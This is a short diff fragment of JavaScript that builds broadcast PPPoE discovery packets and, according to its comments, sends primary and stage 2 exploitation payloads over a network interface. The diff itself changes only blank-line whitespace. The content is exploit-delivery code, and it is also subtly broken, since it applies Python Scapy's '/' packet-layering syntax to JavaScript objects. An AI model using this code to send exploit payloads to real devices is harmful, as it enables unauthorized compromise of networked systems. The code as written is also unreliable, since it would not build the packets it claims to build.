@@ -41,7 +41,7 @@
             // Fetch local MAC address using Scapy.js
             const localMac = await scapy.get_mac_address(iface);
             console.log('Local MAC address:', localMac);
-            
+
             // Create PPPoE packet with payloads for primary and stage 2 exploitation
             const pppoed_pkt = scapy.Ether({src: localMac, dst: 'ff:ff:ff:ff:ff:ff'}) /
                                scapy.PPPoED({service_name: 'Internet'}) /
@@ -49,13 +49,13 @@
 
             // Send PPPoE packet
             await scapy.sendp(iface, pppoed_pkt);
-            
+
             // Optional: Send stage 2 payload after a delay
             await new Promise(resolve => setTimeout(resolve, 1000)); // Adjust delay as necessary
             const stage2_pkt = scapy.Ether({src: localMac, dst: 'ff:ff:ff:ff:ff:ff'}) /
                                scapy.PPPoED({service_name: 'Internet'}) /
                                scapy.Raw(stage2Payload);
-            
+
             await scapy.sendp(iface, stage2_pkt);
         }
 
